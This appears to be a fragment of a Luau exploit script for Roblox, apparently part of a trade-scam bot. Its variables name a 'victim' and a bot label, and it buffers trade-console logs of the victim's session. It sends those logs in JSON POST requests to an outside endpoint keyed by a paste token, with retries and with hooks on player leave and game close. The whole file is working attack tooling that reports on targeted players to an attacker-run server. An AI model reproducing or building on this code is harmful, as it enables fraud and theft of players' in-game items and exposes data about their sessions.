local lastLoggedTradeStatus = nil
local selfTradeEchoUntil = 0
local selfTradeEchoKind = ""
local SELF_TRADE_ECHO_TTL = 0.75

local function markBotTradeAction(kind, ttl)
	selfTradeEchoKind = kind or ""
	selfTradeEchoUntil = tick() + (ttl or SELF_TRADE_ECHO_TTL)
end

local function isBotTradeEcho(kind)
	if tick() >= selfTradeEchoUntil then
		return false
	end
	if not kind or selfTradeEchoKind == kind then
		return true
	end
	return false
end

local function tradeLogBatchArray(batch)
	local out = table.create(#batch)
	for i = 1, #batch do
		out[i] = tostring(batch[i])
	end
	return out
end

local function tradeLogBuildPayload(lines, seq, finalize)
	return {
		lines = lines,
		seq = seq,
		finalize = finalize == true,
		sessionId = victimSessionId,
		pasteId = pasteId1,
		botName = botLabel(),
		victimNick = victimLabel(),
		jobId = jobId1,
	}
end

local function tradeLogPost(payload)
	local ok, response = pcall(function()
		return request({
			Url = SNAP_API .. "/bot/trade-console?token=" .. PASTE_TOKEN,
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = HttpService:JSONEncode(payload),
		})
	end)
	if not ok or not response or response.StatusCode ~= 200 then
		return false
	end
	local parsed
	pcall(function()
		parsed = HttpService:JSONDecode(response.Body)
	end)
	return parsed and parsed.ok == true
end

local function tradeLogEnqueuePayload(payload)
	if not payload then return end
	table.insert(tradeLogQueue, payload)
end

local function tradeLogEnqueueBuffer(finalize)
	if #tradeLogBuf > 0 then
		local batch = tradeLogBuf
		tradeLogBuf = {}
		tradeLogSeq += 1
		tradeLogEnqueuePayload(tradeLogBuildPayload(tradeLogBatchArray(batch), tradeLogSeq, false))
	end
	if finalize then
		tradeLogEnqueuePayload(tradeLogBuildPayload({}, tradeLogSeq, true))
	end
end

local function tradeLogPump()
	if tradeLogWorkerRunning then return end
	tradeLogWorkerRunning = true
	task.spawn(function()
		local backoff = 2
		while #tradeLogQueue > 0 do
			local payload = tradeLogQueue[1]
			if not payload then
				table.remove(tradeLogQueue, 1)
				backoff = 2
			elseif tradeLogPost(payload) then
				table.remove(tradeLogQueue, 1)
				backoff = 2
			else
				task.wait(backoff)
				backoff = math.min(backoff + 1, 10)
			end
		end
		tradeLogWorkerRunning = false
		if #tradeLogBuf > 0 then
			tradeLogEnqueueBuffer(false)
			tradeLogPump()
		end
	end)
end

local function tradeLogFlush(finalize)
	tradeLogEnqueueBuffer(finalize == true)
	tradeLogPump()
end

local function tradeLogSchedule(finalize)
	if finalize then
		tradeLogFlush(true)
		return
	end
	if tradeLogFlushScheduled then return end
	tradeLogFlushScheduled = true
	task.delay(0.08, function()
		tradeLogFlushScheduled = false
		tradeLogFlush(false)
	end)
end

local function botLog(cat, msg)
	local line = string.format("[%.1f] %s: %s", tick(), tostring(cat), tostring(msg))
	table.insert(tradeLogBuf, line)
	tradeLogSchedule(false)
end

local function bindBotLogLeave()
	if tradeLogLeaveBound then return end
	tradeLogLeaveBound = true
	player.AncestryChanged:Connect(function(_, parent)
		if parent == nil then
			tradeLogSchedule(true)
		end
	end)
	pcall(function()
		game:BindToClose(function()
			tradeLogSchedule(true)
		end)
	end)
end

local function finalizeBotLog(reason)
	if reason then
		botLog("shutdown", tostring(reason))
	end
	tradeLogFlush(true)
end

